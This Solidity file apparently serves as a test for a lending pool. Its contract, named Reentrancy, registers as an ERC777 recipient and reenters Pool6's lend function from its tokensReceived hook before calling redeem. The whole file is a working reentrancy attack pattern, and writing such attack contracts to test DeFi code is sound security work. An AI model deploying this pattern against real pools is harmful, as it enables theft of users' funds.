// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import './@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol';
import './@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol';

import './PoolCore/Pool6.sol';
import './DevUSDC.sol';

contract Reentrancy is IERC777Recipient {

    IERC1820Registry private _erc1820 = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

    address bhome;
    address usdc;
    int loops;


    constructor (address _bhome, address _usdc) {
        bhome = _bhome;
        usdc = _usdc;
        loops = 0;

        _erc1820.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));
    }

    function attemptReentry() public {
        DevUSDC(usdc).approve(bhome, 999999999999);
        Pool6(bhome).lend(100);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) override external {
        if(loops < 2) {
            loops = loops+1;
            Pool6(bhome).lend(100000000);
        } else {
            Pool6(bhome).redeem(100000000);
        }

        return;
    }
}